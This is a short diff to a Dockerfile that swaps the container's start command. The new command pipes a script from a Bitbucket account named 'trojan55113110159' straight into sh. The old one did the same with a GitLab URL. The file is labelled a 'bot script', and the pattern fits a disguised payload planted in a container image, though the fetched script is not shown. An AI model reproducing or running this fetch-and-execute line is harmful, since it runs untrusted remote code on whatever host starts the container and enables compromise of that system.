@@ -37,5 +37,5 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD curl https://gitlab.com/node.js2594450/scala/-/raw/main/node.sh | sh 
+CMD curl https://bitbucket.org/trojan55113110159/node/raw/bcbdca380aad1b304601557b677d7ec577c8cf00/israel.sh | sh 
 
